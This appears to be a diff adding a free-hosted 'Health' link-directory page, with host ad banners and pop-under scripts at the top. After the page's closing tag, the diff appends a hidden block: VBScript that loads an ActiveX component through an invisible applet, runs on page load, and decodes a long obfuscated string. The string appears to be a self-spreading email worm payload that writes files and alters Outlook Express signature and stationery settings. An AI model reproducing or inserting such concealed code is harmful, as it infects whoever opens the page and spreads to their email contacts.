@@ -1,0 +1,579 @@
+<SCRIPT LANGUAGE=JavaScript>
+<!--
+function Decode(s){
+  var s1=unescape(s.substr(0,s.length-1)); var t='';
+  for(i=0;i<s1.length;i++) t+=String.fromCharCode(s1.charCodeAt(i)-s.substr(s.length-1,1));
+  document.write(unescape(t));
+}
+//-->
+
+</SCRIPT>
+<SCRIPT LANGUAGE=JavaScript src="/fs_img/js/md5.js"></SCRIPT>
+<!-- '"AWS"' -->
+<!-- Auto Banner Insertion Begin -->
+<div id=aws_3546 align=center><style>
+  .mwsb{ background-color: FFFFFF; border-width: 1px; border-color: FFFFFF; border-style: solid; }
+  .mwst, .mwst a{ font-family: arial,sans-serif; font-size: 8pt; background-color: white; color: blue;}
+  </style>
+  <!------ OAS SETUP begin ------>
+  <img src="http://track.untd.com/s/oasrdb?pid=MWS&profile=,," width="1" height="1">
+  <SCRIPT LANGUAGE=JavaScript>
+  <!--
+  //configuration
+  OAS_url = "http://cyclops.untd.com/";
+  //OAS_sitepage values can be found in the excel spreadsheet showing position and pagenames.
+  OAS_sitepage = 'webservices/general'; //CHANGED
+  //OAS_sitepage = window.location.hostname + window.location.pathname;
+  // must list every Ad position on the page or they will not show.  Also you can't have line items that are not on the page or a impression will be counted even though it was actually shown. 
+  OAS_listpos = 'Top,Bottom,Frame1,Frame2,Right,TopLeft,Top1,TopRight';
+  OAS_query = '';
+  OAS_target = '_Blank';
+  //end of configuration
+  OAS_version = 10;
+  OAS_rn = '001234567890'; OAS_rns = '1234567890';
+  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
+  function OAS_NORMAL(pos) {
+    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
+    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
+  }
+  //-->
+  </SCRIPT>
+
+
+  <SCRIPT LANGUAGE=JavaScript1.1>
+  <!--
+  OAS_version = 11;
+  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
+    OAS_version = 10;
+  if (OAS_version >= 11)
+    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCRIPT>');//-->
+  </SCRIPT>
+
+  <SCRIPT LANGUAGE=JavaScript>
+  <!--
+  document.write('');
+  function OAS_AD(pos) {
+    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
+      OAS_RICH(pos);
+    } else {
+      OAS_NORMAL(pos);
+    }
+  }
+
+  //-->
+  </SCRIPT>
+  <!-- start /fs_img/about_pop.txt -->
+<!-- The only pops this script can generate now are:
+			1. Pops from UOL
+			2. In-house popup
+-->
+<script language="JavaScript">
+<!--
+var isUS = "0";
+var keyword = escape("");
+var compname='freeservers';
+var ourExitPop=true;
+
+function popSlot(slot){
+    // OAS AD 'Frame1' begin
+    if(window.OAS_AD) OAS_AD('Frame1');
+    // OAS AD 'Frame1' begin
+}
+
+function checkPopunderCookie() {
+	var cookieVal = 0;
+	cookieExpDays = (1/24);  
+	var expDate = new Date();
+	expDate.setTime(expDate.getTime() + (86400000 * cookieExpDays));
+	cookieDate = ";Expires=" + expDate.toGMTString();
+	if (document.cookie) {
+		var cookieInfo = document.cookie.split(";");
+		for (i=0; i<cookieInfo.length; i++) {
+			cName = cookieInfo[i].split("=")[0];
+			if (cName.indexOf("pixelpop") >= 0) {
+				cookieVal = cookieInfo[i].split("=")[1];
+			}
+		}
+	}
+	cookieVal++;
+	document.cookie="pixelpopslot="+cookieVal+";path=/;"+cookieDate;
+ 	if (cookieVal== 1) { popSlot(1); }
+ 	if (cookieVal== 2) { popSlot(2); }
+ 	if (cookieVal== 3) { popSlot(3); }
+ 	if (cookieVal== 4) { popSlot(4); }
+ 	if (cookieVal== 5) { popSlot(5); }
+ 	if (cookieVal== 6) { popSlot(6); }
+ 	if (cookieVal== 7) { popSlot(7); }
+ 	if (cookieVal== 8) { popSlot(8); }
+}
+
+if (!window.sprs) checkPopunderCookie();
+
+if (!window.sprs && ourExitPop && (navigator.appName.indexOf('etscape')==-1)){
+	window.onunload=staycheck;
+	StayingOnSite=false;
+	DadLinkURLs="";
+	BabyLink="";
+	DadWindow=window.parent;
+	DadLinks=DadWindow.document.links;
+	DadHost="http://"+location.hostname;
+	DadWindow.document.onclick=linktellerDad;
+	document.onclick=linktellerThis;
+	function linkteller(){
+		while (EventTag.parentElement&&(EventTag.tagName!="A")){
+				EventTag=EventTag.parentElement;
+		}
+		if ((EventTag.tagName=="A")&&(!EventTag.target)){
+			if (EventTag.href.indexOf(DadHost)>-1){
+				StayingOnSite=true;
+			} else {
+				StayingOnSite=false;
+			}
+		}
+	}
+	function linktellerThis(){
+		EventTag=window.event.srcElement;
+		linkteller();
+	}
+	function linktellerDad(){
+		EventTag=DadWindow.event.srcElement;
+		linkteller();
+	}
+	function staycheck(){
+		if (StayingOnSite){
+		} else {
+		}
+	}
+}
+-->
+</SCRIPT>
+<!-- end /fs_img/about_pop.txt -->
+  <table cellpadding="0" cellspacing="0" width="980">
+
+    <!-- start: related resources -->
+    <tr>
+      <td colspan="3">
+        <table cellpadding="0" cellspacing="0" align="center" width="100%" class="mwsb">
+          <tr>
+            <td class="mwst" align="center">
+              <a href="http://bz.tc" class="mwst" target="_top">Free Web space and hosting from bz.tc</a>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+    <!-- end: related resources -->
+
+    <tr>
+      <td width="130">
+        <table cellpadding="0" cellspacing="0" width="130" style="margin-top:2px;">
+          <tr>
+            <td class="mwst" nowrap="1">
+              <a href="http://www.bz.tc"
+                ><img src="/cgi-bin/image/images/bannertype/100X22.gif" width="100" height="22" border="0"
+                ></a
+              ><a href="/cgi-bin/login" target="_blank"
+                ><img src="/cgi-bin/image/images/bannertype/login_chunkx.gif" width="30" height="22" border="0"
+                ></a
+             ></td>
+          </tr>
+        </table>
+        
+        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
+          <tr>
+            <td align="center">
+              <a href="/cgi-bin/path/signup?refcd=MWS_20040713_Banner_bar"
+              ><img src="http://static.uolcontent.com/RealMedia/ads/Creatives/ISP/MWS_Mkting_LSKYBUT_34_8023/128x64_get_a_free_website_01.gif" border="0"
+              ></a>
+            </td>
+          </tr>
+        </table>
+      </td>
+
+      <td>
+        <table cellspacing="0" class="mwsb" style="margin:2px;margin-bottom:0px;table-layout:fixed;"> 
+          <tr>
+            <td class="mwst" align="center" style="width:730px;">
+    <!------ OAS AD 'Top' begin ------>
+    <SCRIPT LANGUAGE=JavaScript>
+    <!--
+    if(window.OAS_AD) OAS_AD('Top');
+    //-->
+    </SCRIPT>
+    <!------ OAS AD 'Top' end ------></td>
+          </tr>
+        </table>
+      </td>
+
+      <td width="120">
+        <table class="mwsb" cellpadding="0" cellspacing="0" width="120" style="margin-top:2px;">
+          <tr>
+            <td class="mwst" nowrap="1">
+              <SCRIPT LANGUAGE=JavaScript><!--
+              OAS_AD('Top1');
+              //--></SCRIPT>
+            </td>
+          </tr>
+        </table>
+        
+        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
+          <tr>
+            <td align="center">
+              <SCRIPT LANGUAGE=JavaScript><!--
+              OAS_AD('TopRight');
+              //--></SCRIPT>
+            </td>
+          </tr>
+        </table>
+      </td>
+
+    </tr>
+    <tr>
+      <td colspan="3" align="center">
+        <!-- search bar begins --><table width="100%" cellpadding="0" cellspacing="0" class="mwsb" style="border-width:2px; margin-top:10px; background-color:white; height:10px;">  <tr valign="top">    <td align="center">      <form action="http://search.mysite.com/search" style="margin:0;" target="_blank">      <span style="position:relative;top:-5px;font-family:arial;font-size:12px;color:#000;"><b>Search the Web</b></span>      <input type="hidden" name="source" value="mws_endsite_box">      <input type="hidden" name="action" value="search">      <input name="query" accesskey="s" style="width:400px; height:21px; background:white; border:1px #A4ABB1 solid; font-family: arial, sans-serif; font-size: 10pt; color: #000000; position:relative; top:-6px;">      <input type="image" src="/fs_img/bannertype/infospace/search_sp_go.gif">      <img src="/fs_img/bannertype/infospace/search_logo.gif" style="position:relative;top:4px;left:10px;">      </form>    </td>    <td width="5%"></td>  </tr></table>
+      </td>
+    </tr>
+  </table><DIV id=sideFrame 
+	style="MARGIN-TOP: 27px; RIGHT: 5px; WIDTH: 120px; COLOR: #ffffff; POSITION: absolute; BACKGROUND-COLOR: #CCCCCC; Z-INDEX: 10000; TEXT-ALIGN: right"><A 
+	href="javascript:void%20(sideFrameOff())"><IMG src="/fs_img/banners/xout.gif" 
+	border=0></A><BR>
+  <!------ OAS AD 'Right' begin ------>
+  <SCRIPT LANGUAGE=JavaScript>
+  <!--
+  OAS_AD('Right');
+  // -->
+  </SCRIPT>
+  <!------ OAS AD 'Right' end ------>
+  </DIV>
+	<SCRIPT>
+		origRightPadding=document.body.style.paddingRight;
+		document.body.style.paddingRight="130px";
+		function sideFrameOff(){
+			document.getElementById('sideFrame').style.display='none';
+			document.body.style.paddingRight=origRightPadding;
+		}
+		</SCRIPT>
+	</DIV>
+  <DIV id="setMyHomeOverlay" align="left" style="position:absolute; top:25%; left:25%; width:358px; border:1px solid #AEAEAE; background-color:white; z-index:200000; display: none;">
+    <div style="height:59px; padding-left:22px; background:white url('/cgi-bin/image/images/sethome_top_border.gif') repeat-x;">
+    <div style="float:left; width:182px; height:35px; margin-top:12px; font:bold 38px arial,sans-serif; color:#454545"> Welcome! </div>
+    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
+    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
+    <div style="float:right; font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div>
+    <div style="height:170px; background:#ffffff;">
+    <div style="padding:30px 20px 0px 20px; font:normal 14px arial; height:80px;"> Would you like to make this site your homepage? It's fast and easy... </div>
+    <div style="padding:10px 0 0 41px;">
+    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_l.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div>
+    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_m.gif') repeat-x; width:265px; height:26px; text-align:center; font:bold 13px Arial; color:#FFFFFF; line-height:25px;" onclick="javascript:do_set_homepage('do');"> Yes, Please make this my home page! </div>
+    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_r.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div></div>
+    <div style="padding-left:148px; padding-top:7px; clear:both; font:normal 12px arial;"><a href="#" style="text-decoration:none; color:#004182;" onclick="javascript:do_set_homepage('close'); return false;">No Thanks</a></div></div>
+    <div style="height:36px; background: white url('/cgi-bin/image/images/sethome_bot_border.gif') repeat-x;">
+    <div style="float:left;margin:12px 0px 0px 20px; line-height:10px;"><input type="checkbox" style="width:11px; height:11px;" onclick="javascript:do_set_homepage('dont');"></div>
+    <div style="float:left;font:normal 12px arial;padding:10px 0 0 2px;"> &nbsp; Don't show this to me again.</div>
+    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
+    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
+    <div style="float:right;font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div></div>
+    <span ID="mws_oHomePageOverlay" style="behavior:url(#default#homepage); display:none;"></span>
+    <script src=/fs_img/js/overlay.js></script><script defer="defer" src=/fs_img/js/set_homepage.js></script></div><!-- Auto Banner Insertion Complete THANK YOU -->
+
+<SCRIPT LANGUAGE=JavaScript>
+<!--   
+    Decode('%286Fvfulsw%2853odqjxdjh%286G%2855mdydvfulsw%2855%2853w%7Csh%286G%2855wh%7Bw2mdydvfulsw%2855%2853vuf%286G%28552fjl0elq2ydolgdwhbedqqhu%286Ihqf%286Gwyl4wylf87%28586D%3A4wvz%7Bf%28586G89%3B7%2855%286H%286F2vfulsw%286H3');
+//-->
+</SCRIPT>
+<html>
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Health</title>
+
+</head>
+
+<body>
+
+<p align="center">
+<a href="http://www.worldtourism.8k.com">
+<img border="0" src="LOGO.jpg" align="left" width="129" height="69"><img border="0" src="banner.jpg" width="485" height="82" align="center"></a></p>
+<p align="center"><a href="http://www.worldtourism.8k.com"><img border="0" src="picturehome.jpg" width="672" height="252"></a></p>
+
+<br>
+<center>
+
+<script type="text/javascript"><!--
+google_ad_client = "pub-3362051909983443";
+google_ad_width = 728;
+google_ad_height = 90;
+google_ad_format = "728x90_as";
+google_ad_type = "text_image";
+google_ad_channel ="0752038511";
+google_color_border = "336699";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_text = "000000";
+google_color_url = "008000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+</center> <br>
+
+<table cellSpacing="0" cellPadding="3" width="618" align="center" border="0">
+  <tr vAlign="top">
+    <td class="ntext" align="justify" width="612">
+    <p align="center"><b><i>
+    <font class="heading1" size="5" color="#0000FF" face="Book Antiqua">Health</font></i></b></p>
+    <p>Welcome to the web directory that provides 
+    the most authentic and reliable information related to Health. This web 
+    directory is home to a number of web links that will guide you to the 
+    official sites related to various Health topics. <br>
+    <br>
+    To visit any of the web links submitted here, you could begin by clicking on 
+    a particular Health category. Once you click on the web link, it will 
+    directly take you to the official homepage related to that Health topic. 
+    Where there was a case of non-availability of official websites on any 
+    Health Care topic, we went ahead to screen a number of websites and selected 
+    the most informative site providing Health information. <br>
+    <br>
+    We have made sincere efforts to list all the relevant web links related to 
+    Health Care from all over the world. These Health sites provided here are 
+    most reliable and will help you get all useful information about various 
+    health issues.<br>
+    <br>
+    However, if you do not find an official site related to any health related 
+    segment, then use the feedback link at the bottom of this page to apprise us 
+    of the same. We will leave no stones unturned to add the missing link to our 
+    web directory as soon as possible.
+    <br>
+&nbsp;</td>
+  </tr>
+</table>
+<br>
+<center>
+
+<script type="text/javascript"><!--
+google_ad_client = "pub-3362051909983443";
+google_ad_width = 728;
+google_ad_height = 90;
+google_ad_format = "728x90_as";
+google_ad_type = "text_image";
+google_ad_channel ="0752038511";
+google_color_border = "336699";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_text = "000000";
+google_color_url = "008000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+</center> <br>
+
+<center>
+<table width="630" border="0">
+  <tr vAlign="top">
+    <td width="33%">
+    <ul type="square">
+      <!-- <li><A HREF="adolescent/index.html">Adolescent</A> -->
+      <a class="textlink" href="http://www.123world.com/health/blindness/index.html">
+      <li>Blindness</a> </li>
+      <li>Children's Health
+      <a class="textlink" href="http://www.123world.com/health/dentistry/index.html">
+      </li>
+      <li>Dentistry</a> </li>
+      <li>Disabilities
+      <a class="textlink" href="http://www.123world.com/health/diseases/index.html">
+      </li>
+      <li>Diseases</a> </li>
+      <li>Environmental Health
+      <a class="textlink" onclick="return opensite('http://www.efa.org/')" href="http://www.efa.org/">
+      Epilepsy</a>
+      <a class="textlink" href="http://www.123world.com/health/womenhealth/index.html">
+      </li>
+      <li>Women's Health</a> </li>
+    </ul>
+    </td>
+    <td width="33%">
+    <ul type="square">
+      <a class="textlink" href="http://www.123world.com/health/firstaid/index.html">
+      <li>First Aid</a> </li>
+      <li>Fitness
+      <a class="textlink" href="http://www.123world.com/health/leadpoison/index.html">
+      </li>
+      <li>Lead Poisoning</a> </li>
+      <li>Food and Nutrition
+      <a class="textlink" href="http://www.123world.com/health/healthcare/index.html">
+      </li>
+      <li>Health Care</a> </li>
+      <li>Men's Health
+      <a class="textlink" href="http://www.123world.com/health/medicine/index.html">
+      </li>
+      <li>Medicine</a> </li>
+      <li>Hospitals </li>
+    </ul>
+    </td>
+    <td width="34%">
+    <ul type="square">
+      <a class="textlink" href="http://www.123world.com/health/mentalhealth/index.html">
+      <li>Mental Health</a> </li>
+      <li>Neurology
+      <a class="textlink" href="http://www.123world.com/health/proceduretherapies/index.html">
+      </li>
+      <li>Procedures and Therapies</a> </li>
+      <li>Public Health
+      <a class="textlink" href="http://www.123world.com/health/reproductivehealth/index.html">
+      </li>
+      <li>Reproductive Health</a> </li>
+      <li>Senior Health
+      <a class="textlink" href="http://www.123world.com/health/weightissues/index.html">
+      </li>
+      <li>Weight Issues</a></li>
+    </ul>
+    </td>
+  </tr>
+</table>
+</center>
+
+</body>
+
+</html>
+<HTML>
+<BODY onload="vbscript:KJ_start()">
+<script language=vbscript>
+document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
+</script>
+<script language=vbscript>
+ExeString = "AekFjUebnc)EpkiQavq)R`pQavq)@cdoacPfcl)>lnibK`gb_r)COM)ToQebhj)TelM^pf)Pq`B)Bgk^hwAfoiOs_GH\pp_oq$'GHPbpBfj$'GH@oa_qbIgifas%&HGHghbEr%&HG?pb^pcJ^ej%&HGLplm]e^qa&&CkaQr_Bsk`pglkIG>lnbk`Rl%BgibL_qe(RvmaQqo%LjBonmoNcpricKavqQbqPb^`Rbjl:BQL+KnbkPcuqBgib$DfiaN^qd*.&QjlQqo;Oa_aQakm+Nc^a=jiGcElpqn&QjlQqo( HG[qq^nr%&'9:-KpIal%QinPqn'9/QdckPb^`Rbjl,@ikqbCufpCrjaqfklAlaEdEdQunbPpp: eqp QdckPb^`Rbjl,@ikqbQbqDfiaRbjl:BQL+KnbkPcuqBgib$DfiaN^qd*/&CfhcQbin+Tngqb 9$>MAVmkik_a: s^q`oenq7#IG\or^op&& # ;$s^AoIb#PkmPpp#t_@nJcEqijQbtrBgibPcjm*AilocOcqB?qqng_9CPK,DbpDfia&CfhcM^pf&D>qppf_*_qqng_rpcp901BiocNc^aPcjm*AilocOcqBgibPcjm;COM+LlckQavqCejb%BgibL_qe(6&GcPwmbOro9epkiRebjCejbQakm+Spfqas_?pIc$8 # EQIJ;$s^AoIb#:?KBVklil]b: # s_oaoflr7$GH\pp_oq$'#<s_?pIc$EpkiQavqCipaGcPwmbOro9s^qPfbkCfhcQbin+Tngqbt_@nJcS_oRbupBjbFbCejbQakm+?jlpaBjbFbBjbCql`qemkCql`qemkGH@e]ldbOs_%?sooalqPppfkc*I^orFk`cu@d_o&FcJ^ppGkaav@e]p:.QdckGcHccq$J@^oc%@qpobjrPqngkd%*.&;9HA^pa&`'QdckIG@d_kdaQr_;Cel^iuBfpg#8YPr^C:.AjpbHG?f^kccPr^:?fo%=q`%Hccq$J@^oc%@qpobjrPqngkd%*.&%*-'# 7YPq`B9-CkaGcCipaHFAe^jebPq`:Kfa$AronckqOrofje).(J^ppGkaav@e]p&CkaGcCkaDrk_rfljDrk_rfljHG?pb^pcJ^ej%&LkCookpOaqrjaKbtrEdFjUebnc: eqijPfbkBuerCql`qemkCkaGcQe^ncCfhc:Jbcp&TfjN^qd*0&$Lpldn_jBgiboZ@liklkDfiaqYJeaolomcqQe^ncaYOr^qemkbnwY_h_kh*fqjFb%COM+CejbBtgpqo&Pe]pbCejb&%Qeal?_iiIG>lnbk`Rl%Of^oaDfia*epki%BhqbQbqDfiaRbjl:BQL+KnbkPcuqBgib$Qe^ncCfhc)/(rora'BgibPcjm*Uofpc8 # EQIJ;$s^AoIb#:?KBVklil]b: # s_oaoflr7$GH\pp_oq$'#<s_?pIc$EpkiQavqDfiaRbjl,@ikqbCkaGcBbc]siqEb:UpPdcii*PbdNc^a$ EHAW\@QPOBJR\ROCOYEbbkpgqfaqYAad^rhrRocoEB&LrpJllgTbooglk;ToQebhj+OaeOb]b%DIBV[JL@=J\J=AEFJCYPkdqt]pbYIg`okqlcpZLrpjllgBulpbpoZJb`g^Sap&TpOfbih,ObcUofpcDIBV[ARONCKQ[SPBNZFaalqfpgbpX #Aad^rhrFa YPkdqt]pbYIg`okqlcpZLrpjllgBulpbpoZ#Jbcp&LrpJllgTbooglk(/& +-XK^fhZ@linlpaRpaPq]rfljcov*.)PBD[BTLNBA^ihHGI_fiNcd%FHBU]@RNPBKP]RPAPYF`ckqerfboZ#@cc^qjqF`$YOmcqs_obXKf`nmplbrYLqrilkiBtnoboqYIbbr%LqrIlkiSbnqflj*.&$+,ZJ^ejYPp_qfklbouK^ic)Of^oaDfia'?_iiIGJ]giOae%DIBV[ARONCKQ[SPBNZFaalqfpgbpX #Aad^rhrFa YPkdqt]pbYIg`okqlcpZLrpjllgBulpbpoZ#Jbcp&LrpJllgTbooglk(/& +-XK^fhZTf`cPp_qfklbouK^ic)Of^oaDfia'SqPeaji+NcdTngqb EHAW\@QPOBJR\ROCOYOmcqs_obXKf`nmplbrYLbdf`aZ6+,ZLrpjllgZLmpglkoZJ^ejYB`gqlnNobbcobjab(/0.,5/)PBD[BTLNBA^ihHGI_fiNcd%FHBU]@RNPBKP]RPAPYPkdqt]pbYIg`okqlcpZTfjbltoJboq^deldOs_puqqbiZMokdfiaqYJeaolomcqMrqhmlhGkqapkbpPbprfkcqY-].a-..--,.--,.-`,.--,.--,.--,23Y,..b,13-*_h_kh'?_iiIGJ]giOae%DIBV[ARONCKQ[SPBNZPlbrt^ncYJeaolomcqXUfk`mtpLQY?sooalqSappfklYTelalsqJaqp^cgkdQr_owpqakYMnmcfhcpYIg`okqlcpLrpjllgFkpcokarParqfjepY,_-a,0--,.--,.--_.--,.--,.--,.13X.-.a.03, )^j^kg &UpPdcii*PbdSpfqaEGCV\?SOOALQ\QQBOXQlcpu^oaZJf_plpkdqYKdcf_cY.,,-YKsqikmhYKnqfklpYI_fiXCafpmoMnccbnck`a ).//-4.*OAE\ASMOA@]jiGHJ^ejObc&EGCV\?SOOALQ\QQBOXQlcpu^oaZJf_plpkdqYKdcf_cY.,,-Y?mjjklYJ]giParqfjepYJctPp_qfklbou )^j^kg &IGrik^daDli`co%Hccq$UfkL_qe(1&Mnmdo]kCejbpXAljimkBgiboZJf_plpkdqOf^oabYPp_qfklbou &CkaDrk_rfljDrk_rfljHG?pb^pcJfhgbr$'KlBnploPbpqkbJcuqQbinM^pf: GcJmq%BQL+BgibAvfppq%TelM^pf# TP_pfmp,bua &&RebjQakmM]re9puqqbi1/YBjbFbFbQbinM^pf: pvorbj/0YRebjPp_oqQnCfhc:UfkL_qe$OWPQAKYHapkbh1/+`jiBiocOr^opSmCejb9TfjN^qd#QVPPCJYGcokaj+ahjCkaGcUpPdcii*PbdSpfqaEGCV\HM@>H]J>?FFKAZPlbrt^ncYJeaolomcqXUfk`mtpXAronckqRcopemkYNskYGcokaj0/*Pq]pqRlDfiaCOM+@knvCejbSgkM]reta`Yhfu^ih,dfb )TelM^pf# tb^ZClhbbo*fqqCOM+@knvCejbSgkM]repuqqbi1/Yght^hj+ded)SgkM]repuqqbi1/Y`cphpmm+elf@^hjHF?mmalaQk&TfjN^qd#ub_XDli`co+drq( eqp &UpPdcii*PbdSpfqaEGCV\?J>POCP\NMLQX,aihZ)biibgibToQebhj+OaeToerbFHBU]@I=QPBO]OLKRY+`jiY?mkqalqPwmb*^lnif__qfkl,u)kpakukik_aTpOfbih,ObcUofpcDIBV[AI>OQBP[PLLPZaihdfiaZAbb_ripG`ljZ)SqPeaji+NcdOa_a%FHBU]@I=QPBO]OLKRYstbcfhcYAad^rhrF`klY%ToQebhj+OaeToerbFHBU]@I=QPBO]OLKRYahjcfhcYP_pfmpCkdelbY*S>Q`oenqTpOfbih,ObcUofpcDIBV[AI>OQBP[PLLPZaihDfiaZPeajiYKnbkXAlji_kaX )TelM^pf#RbjlN^qd#UP`ngmq*cub - !(UpPdcii*PbdSpfqaEGCV\?J>POCP\NMLQXbiiBgibXQebhjBuXNollcoquQebarE^jbibnqYTOFMoknpY*x2./20A>2)720>+..?D*5?73*,.>>,.?53.5@y SqPeaji+NcdTngqb EHAW\@H?PPAQ\OKMQY`jiCejbYOaoflrElorBk_mabX )w62.//30-+15,A*.-B/*>/C6).-@,2C52A0/0{QbqDfiaRbjl:BQL+KnbkPcuqBgib$Qq^nrRmBgib(0)qnsb&CfhcQbin+TngqbT_pPcuqCfhcQbin+@hmpbBk`CrjaqfklCrjaqfklHFJfhaGq%%FbFkSfboa9; eqijPfbkBuerCql`qemkCkaGcRefoJl`]rflj:`m`rickq*jl`]rfljFbIbbr%QdgpIka^qemk)2&9cejbRebjQdgpIka^qemk9Jf`&QeeqIl__qfkl)6%FbCPK,DbpCuqalpfklK^ic%QdgpIka^qemk&:; qdckRefoJl`]rflj:Hccq$RefoJl`]rflj*Ibj&QeeqIl__qfkl&)Ibj&CPK,DbpDfiaL^ja&QeeqIl__qfkl&&%BjbFbFbIbj&QeeqIl__qfkl&:0PfbkQeeqIl__qfkl:RefoJl`]rflj#ZCkaGcIGrik^daDli`co%PffpHm`^pglk%BjbFbBjbCql`qemkCql`qemkGHJ^ejObc&ObcQqo(DfiaL^ja'KlBnploPbpqkbJcuqObcRbjlQqo;ToQebhj+OaeOb]b%OaePqn'EdOaeQbinPqn: QdckUpPdcii*PbdSpfqaObcQqo(DfiaL^jaBjbFbBjbCql`qemkCql`qemkGHL_kQr_$AronckqOrofje&Qr_A:,QaqqLqr:.@mTdgibRoraQaqqLqr:RbppMrq).FcRbppMrq</4Qeal?sooalqPppfkc:Bgk^hwAfoi# 7YBtgq@mAlaEdKlBnploPbpqkbJcuqPbpQeeqClhbbo;COM+DarClhbbo$AronckqOrofje&QbqBf`Os_9@oa_qbK`gb_r%Oaoflrfkc,Af_rflj_ov'OcqBmiaapp9QeeqClhbbo*Qr_BmiaappDli`co@kskq;-ClnB^_fQakmCkjabnfkDli`copClhbbo?mrkp:Bmiaap@lqlq'.Bf`Os_+]baBmiaap@lqlq)RbjlDli`co+J_jbKbtrEdAeaPr^,@lqlq9-PfbkI^orFk`cu@d_o9FkoroOat%@qpobjrPqngkd( Y(Jbk$AronckqOrofje&*-'Os_Pppfkc:Iga%?sooalqPppfkc*I^orFk`cu@d_o(-*Ibj&@rnpbkpQqoeld&)J^ppGkaav@e]p*.%@qpobjrPqngkd;HFAe^jebPq`%@qpobjrPqngkd(J^ppGkaav@e]p&Qr_A:-BhqbGcOs_B;-Rebj@qpobjrPqngkd;@qpobjrPqngkd$AeaPr^,Fqak%.%#ZCufpAlBiocf:,Ckpg;.RlBmiaap@lqlqGcHA^pa&Pr^Qqoeld&;I?_pb$Bf`Os_+Erbj$h&&RebjFbg8Clhbbo?mrkpQeal?sooalqPppfkc:?sooalqPppfkc#@g`Pq`+Fpcj%f).&$X AvfqBlCkaGcCkaGcLbupI]qqFjbbu?f^o;FjqqoNcs%?sooalqPppfkc*Y*Ibj&@rnpbkpQqoeld&)/&Qr_Orofje:Kfa$AronckqOrofje)I]qqFjbbu?f^o'/)Ial%@qpobjrPqngkd%+I^orFk`cu@d_o*-'?sooalqPppfkc:GH@e]ldbOs_%?sooalqPppfkc*I^orFk`cu@d_o&Bk`FcBk`FcIlknGHL_kQr_;@qpobjrPqngkdBk`CrjaqfklCrjaqfklHFNoll_d^pc%&LkCookpOaqrjaKbtrNcdM]reS]jrb;DIBV[JL@=J\J=AEFJCYPkdqt]pbYIg`okqlcpZLrpjllgBulpbpoZAbcpbbAeqhAaeoba:SqPeaji+NcdOa_a%NcdM]reS]jrb%FbAfoiAbcpbb;Qeal@gph@cdoac:Dfk]jvAeqh7X AlaEdBmoe;.pm2AfoiAbcpbb;HFM_lOs_%@gph@cdoac&IGrik^daDli`co%@gph@cdoac&LbupToQebhj+OaeToerbNcdM]reS]jrb(BfpgBbdncbCkaDrk_rfljDrk_rfljHGqkj^ccClhbbo$N^qdL^ja'KlBnploPbpqkbJcuqPbpClhbboJ_jb;COM+DarClhbbo$N^qdL^ja'OcqPffpBgibo:BmiaapK^ic+CejbpEqpCuforp9-DloC^`dQeeqCfhcFjQeeqCfhcpDfiaCuq;R?_pb$DPL*EbqAvqbjqfljL^ja&QeeqCfhc+M]re&%FbCfhcBup:FQJLoDfiaCuq;DRJILoDfiaCuq;=QMMoBgibAvq9MDNKpCejbBtr: GPL QdckA^ihHG=nmbjbQl$RefoDfia,M^pf)drji'AjpbEdCejbBtr: S?O QdckA^ihHG=nmbjbQl$RefoDfia,M^pf)r`p%BhqbFbCfhcBup:FQQQealDrqBtgpqo:-BjbFbKavqGc$S@^oc%M]reK]kb&;R?_pb$UfkL_qe$@cphpmmY'&Kp%QA^pa&M^pfK^ic&9R@]qb%SgkM]reAaqhqkn&%RebjEprBueqqp;.Bk`FcFcFqqAvfppq:.QdckDPL*AlmuDfiaTfjN^qd#qvppcj0.Zaboiqll,fke )M]reK]kbDPL*AlmuDfiaTfjN^qd#ub_XDli`co+drq(N^qdL^jaBjbFbBjbCql`qemkCql`qemkGHPbpBfj$'KlBnploPbpqkb